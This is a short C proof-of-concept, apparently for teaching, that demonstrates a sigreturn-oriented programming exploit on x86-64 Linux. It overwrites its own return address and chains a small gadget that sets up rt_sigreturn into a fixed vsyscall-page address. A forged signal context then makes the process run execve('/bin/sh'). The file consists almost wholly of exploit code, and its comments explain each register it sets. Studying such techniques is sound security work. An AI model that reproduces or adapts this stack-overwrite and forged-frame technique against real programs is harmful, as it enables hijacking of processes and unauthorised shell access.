#include <stdio.h>
#include <string.h>
#include <signal.h>
 
#define SYSCALL 0xffffffffff600007
 
struct ucontext ctx;
char *shell[] = {"/bin/sh", NULL};
 
void gadget();
 
int main()
{
	unsigned long *ret;
 
	/* initializing the context structure */
	bzero(&ctx, sizeof(struct ucontext));
 
	/* setting rip value (points to syscall address) */
	ctx.uc_mcontext.gregs[16] = SYSCALL;
 
	/* setting 0x3b in rax (execve syscall) */
	ctx.uc_mcontext.gregs[13] = 0x3b;
 
	/* setting first arg of execve in rdi */
	ctx.uc_mcontext.gregs[8] = shell[0];
 
	/* setting second arg of execv in rsi */
	ctx.uc_mcontext.gregs[9] = shell;
 
	/* cs = 0x33 */
	ctx.uc_mcontext.gregs[18] = 0x33;
 
	/* overflowing */
	ret = (unsigned long *)&ret + 2;
	*ret = (int)gadget + 4; //skip gadget's function prologue
	*(ret + 1) = SYSCALL;
	memcpy(ret + 2, &ctx, sizeof(struct ucontext));
	return 0;
}
 
void gadget()
{
	asm("mov $0xf,%rax\n");
	asm("retq\n");
}
